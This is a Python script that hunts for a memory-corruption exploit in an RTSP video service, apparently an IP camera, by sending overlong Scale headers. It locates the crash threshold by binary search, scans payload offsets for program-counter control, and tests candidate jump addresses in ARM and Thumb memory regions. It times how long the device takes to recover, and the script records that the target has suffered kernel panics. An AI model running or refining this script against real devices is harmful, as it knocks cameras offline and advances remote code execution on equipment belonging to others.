#!/usr/bin/env python3
"""
rtsp_scale_oracle.py — Scale header overflow oracle.

Scale crashes at ~128 bytes and caused a KERNEL PANIC (>90s recovery),
unlike Transport (~65s recovery) or Accept (~72s recovery).

Kernel panic means the fault reached kernel space or corrupted kernel data.
This could mean:
  a) Stack overflow overflowed past the thread stack into kernel-adjacent memory
  b) A pointer was overwritten that points to kernel-space (device driver, etc.)
  c) The overflow hit a code pointer that runs with elevated privilege

This makes Scale the MOST INTERESTING overflow for exploit development.

Test plan:
  1. Binary-search exact Scale threshold
  2. Scan PC offsets from threshold to threshold+300
  3. Look for:
     - FAST (<4s) = SIGSEGV (bad PC, process dies fast)
     - HIT (4-70s) = code ran
     - PANIC (70-90s) = kernel panic confirmed
     - DEAD (90s) = not recovering in poll window

  Key: if NULL_PC (0x00000000) at some offset gives <4s (SIGSEGV), that's PC control
  But since Scale gives kernel panic, maybe any PC value → kernel panic?
  We need to compare FAST vs PANIC timing to find PC control offset.

Usage: python3 -u rtsp_scale_oracle.py > /tmp/scale_out.txt 2>&1
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=180, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            elapsed = time.time() - t0
            if elapsed > 2:
                print(f"  [✓] RTSP alive ({label}) — waited {elapsed:.0f}s", flush=True)
            return True
        time.sleep(2)
    print(f"  [✗] RTSP not alive after {max_wait}s ({label})", flush=True)
    return False

def build_scale_req(scale_value: bytes) -> bytes:
    return (b"PLAY rtsp://█████████████:554/Streaming/Channels/1 RTSP/1.0\r\n"
            b"CSeq: 3\r\nUser-Agent: TestScale\r\n"
            b"Scale: " + scale_value + b"\r\n\r\n")

def send_req(req_bytes, timeout=8):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(req_bytes)
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return d, True
    except:
        return b"", False

def oracle(req_bytes, label="", poll_timeout=120):
    if not wait_rtsp(max_wait=60, label="pre"):
        return None
    print(f"  [→] {label}", flush=True)
    t0 = time.time()
    send_req(req_bytes)

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n"
    deadline = t0 + poll_timeout
    last_print = t0
    while time.time() < deadline:
        time.sleep(0.4)
        if time.time() - last_print >= 10:
            print(f"    T+{time.time()-t0:.0f}s waiting...", flush=True)
            last_print = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                elapsed = time.time() - t0
                tag = "FAST" if elapsed < 4 else ("HIT" if elapsed < 70 else "PANIC")
                print(f"  [★] T+{elapsed:.1f}s [{tag}]", flush=True)
                return elapsed
        except: pass
    print(f"  [?] no restart in {poll_timeout}s", flush=True)
    return float(poll_timeout)

def classify(t, poll=120):
    if t is None: return "SKIP"
    if t < 4: return "FAST"
    if t < 70: return "HIT"
    if t < poll: return "PANIC"
    return "DEAD"


# ─── Phase 0: Verify and binary-search Scale threshold ───────────────────────

print("=" * 70)
print("Scale overflow oracle (threshold ~128B, previously caused kernel panic)")
print("=" * 70)

wait_rtsp(max_wait=180, label="start")

# First, verify Scale actually crashes
print("\n[*] Quick verification: Scale at 128B crashes?")
req_test = build_scale_req(b"A" * 128)
resp, connected = send_req(req_test)
print(f"  Scale=128B: resp={resp[:40]!r} connected={connected}", flush=True)
if len(resp) == 0 or not connected:
    print("  Confirmed crash at 128B")
else:
    print(f"  Unexpected: got response! May have recovered.")
    print(f"  Checking larger sizes...")
    for sz in [200, 300, 512]:
        req_test = build_scale_req(b"A" * sz)
        resp, c = send_req(req_test)
        print(f"  Scale={sz}B: resp={resp[:30]!r} {'CRASH' if not c or not resp else 'ok'}", flush=True)
        if not c or not resp:
            break

time.sleep(5)
wait_rtsp(max_wait=180, label="after Scale verification")

# Binary search
print("\n[*] Binary-searching Scale threshold...")
lo, hi = 64, 256
while lo < hi - 1:
    mid = (lo + hi) // 2
    req_m = build_scale_req(b"A" * mid)
    resp_m, c_m = send_req(req_m)
    crashed = not c_m or len(resp_m) == 0
    print(f"  Scale {mid}B → {'CRASH' if crashed else 'ok'}", flush=True)
    if crashed:
        hi = mid
        # Brief wait for recovery (Scale causes hard crashes)
        time.sleep(3)
        for _ in range(20):
            if rtsp_alive(): break
            time.sleep(3)
    else:
        lo = mid
    time.sleep(0.5)

SCALE_THRESHOLD = hi
print(f"\n  Scale threshold: crash at {SCALE_THRESHOLD}B, ok at {lo}B", flush=True)
wait_rtsp(max_wait=180, label="after threshold search")


# ─── Phase 1: Baseline ────────────────────────────────────────────────────────

print()
print("=" * 70)
print(f"Phase 1: Scale baseline (all-A at threshold={SCALE_THRESHOLD})")
print("  Expect: if PANIC (70-120s) → this is a special overflow target")
print("=" * 70)

req_base = build_scale_req(b"A" * SCALE_THRESHOLD)
t_base = oracle(req_base, label=f"Scale baseline {SCALE_THRESHOLD}B all-A", poll_timeout=120)
print(f"  baseline={t_base:.1f}s → {classify(t_base, 120)}", flush=True)
time.sleep(5)
wait_rtsp(max_wait=180, label="after baseline")


# ─── Phase 2: PC offset scan ──────────────────────────────────────────────────

print()
print("=" * 70)
print(f"Phase 2: Scale PC offset scan")
print(f"  Scanning pad from {SCALE_THRESHOLD} to {SCALE_THRESHOLD+300}, step 4")
print(f"  Using NULL_PC=0x00000000")
print(f"  FAST (<4s) = PC control with bad addr → SIGILL/SIGSEGV immediately")
print(f"  PANIC (70-120s) = still hitting kernel-panic-class corruption")
print("=" * 70)

NULL_PC = struct.pack('<I', 0x00000000)
DEAD_PC = struct.pack('<I', 0xDEADBEEF)
BAD_PC  = struct.pack('<I', 0x00000001)

scale_hits = []
for pad in range(SCALE_THRESHOLD, SCALE_THRESHOLD + 300, 4):
    payload = b"A" * pad + NULL_PC + b"C" * 32
    req = build_scale_req(payload)
    t = oracle(req, label=f"Scale pad={pad} NULL_PC", poll_timeout=120)
    cls = classify(t, 120)
    print(f"  pad={pad:4d}  t={t:.1f}s  {cls}", flush=True)

    if cls == "FAST":
        scale_hits.append(pad)
        print(f"  *** FAST at pad={pad} → STRONG PC CONTROL CANDIDATE! ***", flush=True)
    elif cls == "HIT":
        print(f"  ** HIT at pad={pad} → possible code exec **", flush=True)

    time.sleep(5)
    wait_rtsp(max_wait=180, label=f"after pad={pad}")


# ─── Phase 3: If hits found, address oracle ──────────────────────────────────

if scale_hits:
    PC_OFF = scale_hits[0]
    print()
    print("=" * 70)
    print(f"Phase 3: Scale address oracle at PC_OFF={PC_OFF}")
    print("=" * 70)

    ADDRS = [
        (0x00000001, "almost_null"),
        (0x00008000, "ELF_0x8000_ARM"),
        (0x00008001, "ELF_0x8000_THUMB"),
        (0x00010000, "ELF_0x10000_ARM"),
        (0x00010001, "ELF_0x10000_THUMB"),
        (0x00020000, "ELF_0x20000_ARM"),
        (0x00020001, "ELF_0x20000_THUMB"),
        (0x40000000, "mmap_0x40000000"),
        (0x40000001, "mmap_THUMB"),
        (0xBFFF8000, "stack"),
        (0xDEADBEEF, "DEADBEEF_panics?"),
    ]

    for addr, label in ADDRS:
        payload = b"A" * PC_OFF + struct.pack('<I', addr) + b"C" * 32
        req = build_scale_req(payload)
        t = oracle(req, label=f"Scale 0x{addr:08X} ({label})", poll_timeout=120)
        cls = classify(t, 120)
        print(f"  0x{addr:08X}  {label:25s}  {t:.1f}s  {cls}", flush=True)
        if cls == "PANIC" and addr < 0xC0000000:
            print(f"    → Userspace addr caused kernel panic → might be special code path!", flush=True)
        time.sleep(5)
        wait_rtsp(max_wait=180, label=f"after {label}")

print()
print("=" * 70)
print("Scale overflow summary:")
print(f"  threshold: {SCALE_THRESHOLD}B")
print(f"  baseline:  {t_base:.1f}s → {classify(t_base, 120)}")
print(f"  PC candidates: {scale_hits}")
print("Done.")
